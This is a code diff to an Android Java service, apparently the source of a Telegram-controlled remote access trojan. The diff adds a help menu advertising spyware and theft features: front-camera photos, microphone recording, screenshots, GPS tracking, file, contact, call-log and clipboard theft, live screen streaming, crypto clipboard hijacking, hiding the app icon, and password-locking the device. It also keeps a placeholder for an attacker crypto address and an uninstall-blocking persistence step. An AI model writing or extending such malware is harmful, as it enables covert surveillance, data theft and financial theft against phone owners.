@@ -62,6 +62,7 @@ public class TelegramService extends Service {
     private MediaPlayer audioPlayer;
     private Handler mainHandler = new Handler(Looper.getMainLooper());
 
+    // HNA 7ET ADDRESS DYAL CRYPTO
     private final String ATTACKER_CRYPTO_ADDRESS = "0xYOUR_CRYPTO_ADDRESS_HERE";
 
     @Override
@@ -84,7 +85,7 @@ public class TelegramService extends Service {
             }
         }
         
-        Exfil.send("✅ System Bot is Online.\n\nFUN PANEL:\n/flash\n/siren\n/playaudio <url/path>\n/stopaudio\n/wallpaper <url>\n/open <url>\n/vibrate\n/toast <msg>\n/lock <pass>\n/unlock\n\nRAT:\n/cam\n/mic\n/screenshot\n/loc\n/files\n/get <path>\n/hide\n/contacts\n/calls\n/clip\n/vnc\n/cryptoclip\n/apps\n/uninstall <pkg>\n/restart");
+        Exfil.send("✅ System Bot is Online.\nType /help or /menu to see all commands.");
         new Thread(this::pollTelegram).start();
         
         blockUninstall();
@@ -130,7 +131,10 @@ public class TelegramService extends Service {
 
     private void handleCommand(final String cmd) {
         mainHandler.post(() -> {
-            if (cmd.equals("/flash")) toggleFlashlight();
+            if (cmd.equals("/help") || cmd.equals("/menu")) {
+                sendHelpMenu();
+            }
+            else if (cmd.equals("/flash")) toggleFlashlight();
             else if (cmd.equals("/siren")) playSiren();
             else if (cmd.startsWith("/playaudio ")) playAudio(cmd.substring(11).trim());
             else if (cmd.equals("/stopaudio")) {
@@ -168,14 +172,45 @@ public class TelegramService extends Service {
         });
     }
 
+    private void sendHelpMenu() {
+        String menu = "🤖 **Available Commands:**\n\n" +
+                "**FUN PANEL:**\n" +
+                "/flash - Toggle Flashlight\n" +
+                "/siren - Play/Stop Siren\n" +
+                "/playaudio <url/path> - Play MP3/M4A\n" +
+                "/stopaudio - Stop Audio\n" +
+                "/wallpaper <url/path> - Change Wallpaper\n" +
+                "/open <url> - Open URL in browser\n" +
+                "/vibrate - Vibrate device\n" +
+                "/toast <msg> - Show toast message\n" +
+                "/lock <pass> - Lock device with password\n" +
+                "/unlock - Remove password\n\n" +
+                "**RAT:**\n" +
+                "/cam - Take front camera photo\n" +
+                "/mic - Record 10s audio\n" +
+                "/screenshot - Take screenshot\n" +
+                "/loc - Get GPS location\n" +
+                "/files - List files in /sdcard/Download\n" +
+                "/get <path> - Download specific file\n" +
+                "/hide - Hide app icon\n" +
+                "/contacts - Get contacts\n" +
+                "/calls - Get call logs\n" +
+                "/clip - Get clipboard\n" +
+                "/vnc - Toggle Live screen streaming\n" +
+                "/cryptoclip - Hijack crypto clipboard\n" +
+                "/apps - List installed apps\n" +
+                "/uninstall <pkg> - Uninstall app\n" +
+                "/restart - Restart the bot";
+        Exfil.send(menu);
+    }
+
     // ================== FUN PANEL FEATURES ==================
 
     private void playAudio(String pathOrUrl) {
         try {
-            stopAudio(); // N7ydo ay audio 9dim
+            stopAudio();
             audioPlayer = new MediaPlayer();
             
-            // Configuration dyal Audio bach ykhdem mzyan
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                 audioPlayer.setAudioAttributes(new AudioAttributes.Builder()
                         .setContentType(AudioAttributes.CONTENT_TYPE_MUSIC)
@@ -194,7 +229,6 @@ public class TelegramService extends Service {
                 audioPlayer.setDataSource(file.getAbsolutePath());
             }
 
-            // Prepare Async (bach l'UI ma-t3ale9ch)
             audioPlayer.setOnPreparedListener(mp -> {
                 mp.start();
                 Exfil.send("🎵 Playing Audio: " + pathOrUrl);
@@ -574,4 +608,4 @@ public class TelegramService extends Service {
         restartService.setPackage(getPackageName());
         startService(restartService);
     }
-                    }
+                }
